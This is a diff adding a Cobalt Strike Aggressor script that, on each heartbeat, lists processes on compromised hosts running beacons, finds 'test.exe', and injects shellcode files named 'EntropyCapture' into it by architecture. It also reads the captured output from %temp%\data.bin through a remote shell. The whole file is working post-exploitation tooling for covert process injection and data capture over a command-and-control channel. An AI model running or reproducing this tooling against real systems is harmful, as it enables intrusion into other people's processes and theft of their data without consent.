@@ -1,0 +1,47 @@
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+		foreach $index => $beaconid (@beacons)
+		{
+		    bps($beaconid,&handleProcess);
+		}	
+}
+
+sub handleProcess{
+	$processList = $2;
+	$index = indexOf($processList, "test.exe", 0) + 9;
+
+	if($index > 9){
+
+		$temp = substr($processList,$index,-1);
+		$pid = split("\t",$temp)[1];
+		$arch = split("\t",$temp)[2];
+
+		if ($pid !in @pids){
+			add(@pids,$pid,0);
+			blog($1,"Injecting into PID: $pid");
+			if ($arch eq "x64"){
+				bshinject($1, $pid , "x64" ,script_resource("EntropyCapture_x64.tmp"));
+			} else {
+				bshinject($1, $pid , "x86" ,script_resource("EntropyCapture_x86.tmp"));
+			}
+			
+		}
+	}
+}
+
+alias start_entropyCapture {
+       blog($1, "Entropy Capture started\n");
+       add(@beacons,$1,0);
+}
+
+alias stop_entropyCapture {
+       blog($1, "Entropy Capture stopped");
+       remove(@beacons,$1);
+}
+
+alias show_entropyCapture {
+	bshell($1,"type %temp%\\data.bin")
+}
+
